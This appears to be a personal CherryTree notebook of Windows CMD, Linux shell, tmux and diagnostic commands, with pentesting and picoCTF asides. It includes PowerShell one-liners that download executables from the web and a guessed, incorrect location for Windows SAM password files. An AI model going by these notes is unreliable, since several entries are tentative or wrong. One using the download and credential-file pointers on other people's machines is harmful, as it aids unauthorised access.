<?xml version="1.0" ?>
<cherrytree>
	<node custom_icon_id="0" foreground="#3d3fc8" is_bold="True" name="Windows" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587419334.25" ts_lastsave="1590451609.9" unique_id="399">
		<rich_text>mostly needed for sis' pc, z\faruk</rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="CMD Commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587419359.17" ts_lastsave="1589761332.05" unique_id="400">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="type" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587419373.04" ts_lastsave="1587680748.22" unique_id="401">
				<rich_text>win version of cat</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="more" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589760081.16" ts_lastsave="1589760083.3" unique_id="519">
				<rich_text>same as type?</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="whoami" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587680748.43" ts_lastsave="1587680756.05" unique_id="451">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="whoami /groups" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587680756.26" ts_lastsave="1587731355.55" unique_id="452">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="download file" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587731355.77" ts_lastsave="1587733138.43" unique_id="458">
				<rich_text>powershell.exe (new-object System.Net.WebClient).DownloadFile('</rich_text>
				<rich_text link="webs https://ftp.nluug.nl/pub/vim/pc/gvim82.exe">https://ftp.nluug.nl/pub/vim/pc/gvim82.exe</rich_text>
				<rich_text>','C:\Users\z\faruk\gvim82.exe')


WARNING: this sometimes doesnt work

powershell.exe (new-object System.Net.WebClient).DownloadFile('</rich_text>
				<rich_text link="webs https://eternallybored.org/misc/wget/1.20.3/64/wget.exe">https://eternallybored.org/misc/wget/1.20.3/64/wget.exe</rich_text>
				<rich_text>','C:\Users\z\faruk\wget.exe')</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="wget" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587733126.78" ts_lastsave="1589755260.33" unique_id="462">
				<rich_text>wget for windows
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Usage:
wget.exe </rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="run git bash" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587732178.78" ts_lastsave="1589760076.35" unique_id="460">
				<rich_text>&quot;C:\Program Files\Git\bin\sh.exe&quot; --login
dont use '--login' maybe?</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="rename" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587731485.13" ts_lastsave="1587731485.13" unique_id="459">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="cls" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587732853.65" ts_lastsave="1589755356.24" unique_id="461">
				<rich_text>ctrl + l</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="move" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587734685.85" ts_lastsave="1587734689.65" unique_id="465">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="write to file, echo " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587734689.88" ts_lastsave="1591198781.17" unique_id="466">
				<rich_text>apppend text into files
@echo this is a test &gt; test.txt                 #overwrite
@echo hello hellohe lheoeo &gt;&gt; test.txt          #append


Alternative:
</rich_text>
				<rich_text family="monospace">(
  echo Line1
  echo Line2
  ...
  echo Last Line
) &gt; filename.txt</rich_text>
				<rich_text>


@ aciklamasi:
It inherits the meaning from DOS. </rich_text>
				<rich_text link="webs http://academic.evergreen.edu/projects/biophysics/technotes/program/batch.htm#@">@</rich_text>
				<rich_text>:
In DOS version 3.3 and later, hides the echo of a batch command. Any output generated by the command is echoed.
Without it, you could turn off command echoing using the </rich_text>
				<rich_text family="monospace">echo off</rich_text>
				<rich_text> command, but that command would be echoed first.
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="unzip" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589755458.34" ts_lastsave="1589755763.55" unique_id="510">
				<rich_text>cant unzip .tar.gz</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="dir" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589757657.68" ts_lastsave="1589757719.81" unique_id="464">
				<rich_text>


Usage:
1) dir file search (like linux's find)
dir flag2.txt /s /p

Arguments:
/s      #search all folders below
/p      #stop after finding one?, smth like that
</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="File Structure" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1590451609.96" ts_lastsave="1591198809.36" unique_id="136">
			<rich_text></rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="C" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1590451612.01" ts_lastsave="1590451613.33" unique_id="137">
				<rich_text></rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="system32" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1590451613.39" ts_lastsave="1590451617.63" unique_id="138">
					<rich_text></rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name=".config" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1590451620.16" ts_lastsave="1590451620.95" unique_id="139">
						<rich_text>presumably, SAM pw files are here </rich_text>
					</node>
				</node>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="vim over ssh" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587733502.59" ts_lastsave="1589760058.34" unique_id="463">
			<rich_text>is nightmare fuel
doesnt work
not with mintty
not with git bash (running default cmd)
dont try
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Privelage" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589761349.2" ts_lastsave="1589761350.47" unique_id="524">
			<rich_text>The SYSTEM account is the highest privilege level in the Windows user model. It exists to provide ownership to objects that are created before a normal user logs on, such as the Local Security Authority Subsystem (LSASS) and the Session Management Subsystem (SMSS). </rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="#ff0000" is_bold="True" name="Linux Terminal" prog_lang="custom-colors" readonly="False" tags="linux terminal bash" ts_creation="1569040898.16" ts_lastsave="1590111380.17" unique_id="1">
		<rich_text></rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Alternative Shells" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586634398.93" ts_lastsave="1592246193.26" unique_id="298">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="bash" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586634402.29" ts_lastsave="1586634404.76" unique_id="299">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="dash" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586634404.86" ts_lastsave="1586634409.25" unique_id="300">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="fish" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586634451.95" ts_lastsave="1592246166.88" unique_id="303">
				<rich_text>-Fish shell (supposedly better out of the box than omz)
A few sample points that I find really useful:
• Very nice history search. Type a word and hit up arrow on your keyboard.
• fish_config - Try executing this :)
• I prefer the way things are configured. This is a directory inside your ~/.config.
• Syntax highlighting, colors etc.
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="KornShell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586634409.34" ts_lastsave="1586634451.86" unique_id="301">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="powershell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586634454.73" ts_lastsave="1586634454.73" unique_id="304">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="oh my zsh" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586634414.81" ts_lastsave="1592246179.51" unique_id="302">
				<rich_text>many ppl like this</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Alternative Terminals" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569053819.33" ts_lastsave="1589934970.37" unique_id="44">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="tmux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569059976.6" ts_lastsave="1589859125.51" unique_id="53">
				<rich_text>The biggest benefit to tmux is:
“It runs your window in a process and not tied to your session.”

I suppose every window you close still runs in the background? Yes.

!prefix + ? for keybindings!</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="Commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570713506.31" ts_lastsave="1570809066.26" unique_id="57">
					<rich_text>
</rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name="attach -t [name]" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570714643.99" ts_lastsave="1589858800.3" unique_id="60">
						<rich_text>tmux attach -t 0

This command can create nested sessions on top of eachother, you can navigate between them.

When you connect to another box, you can attach tmux sessions that are active there, to your current tmux session with this.

-t means TARGET
[name] is the session you want to attach to your current tmux session.

SUPER HELPFUL NOTE: The target machine still uses its own .tmux.conf. With that you can use Ctrl + B for the nested session, and Ctrl + A (that you configured as the prefix on your main machine) to control your main tmux session.
</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="exit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715019.06" ts_lastsave="1570807693.33" unique_id="62">
						<rich_text>exits current pane and closes it forever</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="kill-ses -t &lt;sessionname&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570809066.27" ts_lastsave="1589431072.43" unique_id="88">
						<rich_text>tmux kill-ses -t 0</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="kill-session -a" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570809150.41" ts_lastsave="1570809152.28" unique_id="90">
						<rich_text>kills all sessions but the current</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="ls" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570714678.05" ts_lastsave="1570714686.16" unique_id="61">
						<rich_text>prints active tmux sessions</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="new -s [name]" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570713512.7" ts_lastsave="1570713904.96" unique_id="58">
						<rich_text>Creates a new session.</rich_text>
					</node>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="Shortcuts" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570712341.43" ts_lastsave="1570807533.94" unique_id="2">
					<rich_text>
</rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name="PREFIX" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570712352.79" ts_lastsave="1589859309.21" unique_id="54">
						<rich_text>default: Ctrl + B
edited: Ctrl + A
allows you to input stuff into tmux after hitting it.




</rich_text>
						<node custom_icon_id="0" foreground="" is_bold="False" name="Alt + Shift + P" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570809524.19" ts_lastsave="1591198852.72" unique_id="91">
							<rich_text>-!!!-CUSTOM BINDING-!!!-
saves all pane info to a log file.
SUPER DUPER HANDY WHILE PENTESTING
needs logging plugin</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="j [window]" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715605.5" ts_lastsave="1591198851.58" unique_id="76">
							<rich_text>-!!!-CUSTOM BINDING-!!!-
joins [window] to the window you are currently in</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="s [window]" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715475.09" ts_lastsave="1591198850.34" unique_id="75">
							<rich_text>!!!CUSTOM BINDING!!!
sends pane to [window]
</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="!" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570809973.93" ts_lastsave="1570809976.0" unique_id="96">
							<rich_text>pane to window</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="&quot;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570807471.73" ts_lastsave="1570807479.74" unique_id="87">
							<rich_text>add a horizontal pane</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="$" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570807176.32" ts_lastsave="1570807178.24" unique_id="85">
							<rich_text>rename session</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="%" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570807468.14" ts_lastsave="1579134937.65" unique_id="86">
							<rich_text>add a vertical pane</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="," prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715138.68" ts_lastsave="1586539686.02" unique_id="64">
							<rich_text>rename-window
</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="1-9" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570712414.17" ts_lastsave="1570809524.18" unique_id="55">
							<rich_text>windows</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name=":" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570809095.13" ts_lastsave="1570809116.19" unique_id="89">
							<rich_text>enables typing commands on the tmux info-bar</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="c" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570712421.63" ts_lastsave="1570807176.31" unique_id="56">
							<rich_text>unnamed new window</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="ctrl + arrows" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570809794.62" ts_lastsave="1570809815.24" unique_id="93">
							<rich_text>resizes the panes</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="d" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570715042.59" ts_lastsave="1589858772.48" unique_id="63">
							<rich_text>detach tmux session
</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="f" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570805950.31" ts_lastsave="1570806006.16" unique_id="83">
							<rich_text>search sessions(windows)</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="space" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586631173.0" ts_lastsave="1586631174.53" unique_id="284">
							<rich_text>swaps panes around</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="w" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570806327.7" ts_lastsave="1570806338.03" unique_id="84">
							<rich_text>displays sessions(windows)</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="x" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570810024.55" ts_lastsave="1572273783.8" unique_id="97">
							<rich_text>kill pane</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="z" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570809636.08" ts_lastsave="1570810024.53" unique_id="92">
							<rich_text>zooms into the pane
only useful when you have multiple panes open in the same window
</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="{}" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570809900.71" ts_lastsave="1589859566.93" unique_id="94">
							<rich_text>move pane to left, right</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="()" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589859566.96" ts_lastsave="1589859569.06" unique_id="77">
							<rich_text>change sessions</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="?" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589601157.64" ts_lastsave="1589601159.31" unique_id="491">
							<rich_text>keybindings listing</rich_text>
						</node>
						<node custom_icon_id="0" foreground="" is_bold="False" name="q, [" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589859309.52" ts_lastsave="1591198889.15" unique_id="531">
							<rich_text>enter copy-mode

copy-mode commands:
/           search downwards
?           search upwards
#           list page buffers
hjkl        arrow keys
space       start selection
enter       copy selection
G,g         top, bottom</rich_text>
						</node>
					</node>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Terminator" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569059973.95" ts_lastsave="1569059973.95" unique_id="52">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="guake" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589934970.7" ts_lastsave="1589935799.63" unique_id="566">
				<rich_text>its an interesting terminal
used for poor-mans-pentest scripts

the terminal has the ability to keybind hiding it, and making it reappear

Toogle Guake visibility: Shift+Enter

Now we can use this keyboard shortcut to gain/lose window focus at will.
</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569040929.17" ts_lastsave="1591015611.71" unique_id="3">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Navigation" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569041584.04" ts_lastsave="1589858753.36" unique_id="11">
				<rich_text>
</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="cd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569041297.01" ts_lastsave="1569043866.49" unique_id="6">
					<rich_text>change directory
arguments:
~ : home dir

</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="cp &lt;f1&gt; &lt;f2&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569044605.72" ts_lastsave="1589426507.76" unique_id="18">
					<rich_text>copy

Usage:
cp file1.txt ~/dir2/file1.txt
cp -r folder/. ~/.                #cp everything inside folder to home
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="ls" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569041256.98" ts_lastsave="1586725377.43" unique_id="5">
					<rich_text>list
Arguments:
-l      
-al     //YOU should basically use this at all times

</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="mkdir" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569041525.68" ts_lastsave="1569054579.55" unique_id="8">
					<rich_text>
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="mv &lt;f1&gt; &lt;f2&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569044562.86" ts_lastsave="1591389059.34" unique_id="17">
					<rich_text>move

Rename:
mv filename newfilename
mv * ../

An interesting usage for renaming:
mv handy-shellcode{,_COMPLETE}
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="pwd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569040939.24" ts_lastsave="1569041587.33" unique_id="4">
					<rich_text>print working directory
eg output:
/home/dave</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="rm &lt;filename&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569044743.11" ts_lastsave="1586881140.28" unique_id="19">
					<rich_text>you need write permissions to the file that is to be deleted</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="rmdir &lt;dir&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569044811.86" ts_lastsave="1587234693.54" unique_id="20">
					<rich_text>doesn't work if there is a file in the directory
rm -R dir2       //deletes recursively</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Diagnostics (sysinfo)" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586351679.15" ts_lastsave="1591199275.52" unique_id="128">
				<rich_text>
</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="lscpu" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586351689.34" ts_lastsave="1586351689.34" unique_id="135">
					<rich_text>
</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="blkid" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569046158.13" ts_lastsave="1591199260.72" unique_id="30">
					<rich_text>outputs hard drive information</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="env" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591016131.66" ts_lastsave="1591199269.85" unique_id="585">
					<rich_text>outputs some environment variables (doesnt output user set vars f.e.)
 </rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="df -h" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569047050.62" ts_lastsave="1591199422.8" unique_id="36">
					<rich_text>outputs disk space usage
-h is for human readable    </rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="lsblk" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586435735.14" ts_lastsave="1591199801.3" unique_id="277">
					<rich_text>lists partitions and mount points</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="lspci" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569047094.43" ts_lastsave="1591199844.64" unique_id="38">
					<rich_text>outputs info on connected pci devices</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="lsubs" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569047073.76" ts_lastsave="1591199856.51" unique_id="37">
					<rich_text>outputs info on connected usb devices</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="uname -a" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569045956.85" ts_lastsave="1591200403.4" unique_id="29">
					<rich_text>gives kernel version etc.</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="df -h" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591015612.11" ts_lastsave="1591200676.12" unique_id="584">
					<rich_text>mounted drive &amp; partition info</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="gnome" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1585920716.08" ts_lastsave="1589858721.04" unique_id="161">
				<rich_text>
</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="eog &lt;file&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570892130.22" ts_lastsave="1585920862.22" unique_id="122">
					<rich_text>eye of gnome
image viewer.</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="nautilus" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570861147.96" ts_lastsave="1585920892.09" unique_id="101">
					<rich_text>file browser for gnome</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="xclip" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570861504.65" ts_lastsave="1589858742.06" unique_id="103">
				<rich_text>Multiple Clipboards manager.

install: sudo apt install xclip
</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="alias" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570893604.31" ts_lastsave="1591199053.07" unique_id="129">
					<rich_text>alias xclip = ‘xclip -selection clipboard’

That way you can just type ‘command | xclip’ to copy the output to clipboard

A good way to alias is to add this to ~/.bash_aliases and source to run it in the terminal as the new profile.
Note that .bash_aliases need to be defined in .bashrc for this to work every login.</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="xfce" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1585920868.86" ts_lastsave="1589858739.72" unique_id="163">
				<rich_text>
</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="ristretto" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1585920911.96" ts_lastsave="1585920913.69" unique_id="165">
					<rich_text>image viewer for xfce</rich_text>
				</node>
				<node custom_icon_id="0" foreground="" is_bold="False" name="thunar" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1585920897.53" ts_lastsave="1589936996.1" unique_id="164">
					<rich_text>file browser for xfce

Ctrl + 1 2 3    #change file appearance</rich_text>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name=".." prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586889431.2" ts_lastsave="1591199091.67" unique_id="350">
				<rich_text>Usage:
&lt;command&gt; ..    # gives suggestions based on how much of the program name you typed so far
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="addgroup" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586885756.9" ts_lastsave="1591016131.26" unique_id="347">
				<rich_text>root only</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="adduser" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586885753.59" ts_lastsave="1591199136.18" unique_id="346">
				<rich_text>root only</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="alias &lt;word&gt;=&quot;clear&quot;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569045184.76" ts_lastsave="1570891628.45" unique_id="24">
				<rich_text>when you input &lt;word&gt; it will execute the command within inverted commas
this may not be permanent</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="awk" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579644631.68" ts_lastsave="1586681592.03" unique_id="160">
				<rich_text>allows multi-line grep searches :)
starts from select, prints until from.
dont know what happens if there are multiple select from pairs

AWK is awesome
it can also cut columns
like so:
awk '{print $2}'

Usage:
</rich_text>
				<rich_text family="monospace">awk '/select/,/from/' file.</rich_text>
				<rich_text>ext
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="base64" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579247903.15" ts_lastsave="1591199165.71" unique_id="143">
				<rich_text>Usage(encode):

Usage(decode):
echo “EncodedString==” | base64 -d
base64 -d &lt;&lt;&lt; “EncodedString==”
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="cat &lt;filename&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569044010.64" ts_lastsave="1586875991.72" unique_id="14">
				<rich_text>outputs text format of the file to the terminal
alternative: less

Arguments:
-n: show line nubmers
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="chattr" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587503805.24" ts_lastsave="1587504661.59" unique_id="435">
				<rich_text>chattr +i file      #makes the file immutable</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="chmod" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862122.22" ts_lastsave="1586880802.63" unique_id="106">
				<rich_text>+x &lt;filename&gt; →  gives executable to all groups
./file → to execute

see Linux Core -&gt; Permissions for more details</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="chown" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586880756.66" ts_lastsave="1591199356.2" unique_id="340">
				<rich_text>chown userName file
or
chown userName:groupName file


Note: You can only use chown if you are &quot;above&quot; the other user, meaning that chown is best done with the root user. So there's hierarchy between groups like in discords roles? Yes, exactly. See `Linux Core -&gt; Permissions` for more details...</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="clear" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569043922.89" ts_lastsave="1591199371.57" unique_id="12">
				<rich_text>clr screen
ctrl+l
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="curl &quot;LINK&quot;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570862163.93" ts_lastsave="1579247568.73" unique_id="107">
				<rich_text>Makes a request to the webpage and allows us to see the output. 

Usage:
curl “https://picoctf.com/resources” | grep -oE “picoCTF{.*}”
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="dd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586435795.52" ts_lastsave="1591384710.54" unique_id="278">
				<rich_text>dd if(input file)=arch.iso of(output file)=/dev/sde (i guess this is the partition to write to?) bs=1M

Binary file manipulation(NOT TESTED):
dd if=filename bs=1 skip=24 &gt; filename_cut          # Cut binary files(skip first 24 bytes, bs is blocksize which is 1 byte)
(dd if=save1 bs=1 count=24; cat save1_prepended)    # prepend the cut binary to the file.

Arguments:
if=     # input file
of=     # output file
bs=     # block size (integer, bytes)
skip=   # skip first X blocksizes (not sure about the X blocksizes part, it might also be X bytes)
count=  # get first X blocksizes (read above)

WARNING: 
please dont waste time trying to use this.
do yourself a favor and use gui versions instead
they are much safer and human readable</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="diff -y &lt;f1&gt; &lt;f2&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586682002.15" ts_lastsave="1586682044.59" unique_id="315">
				<rich_text>compares 2 files in a vertical manner SWEET!
You can pipe this into cat/less!</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="file &lt;filename&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570861410.13" ts_lastsave="1591384010.23" unique_id="102">
				<rich_text>determines the file type with magicbytes on priority 2

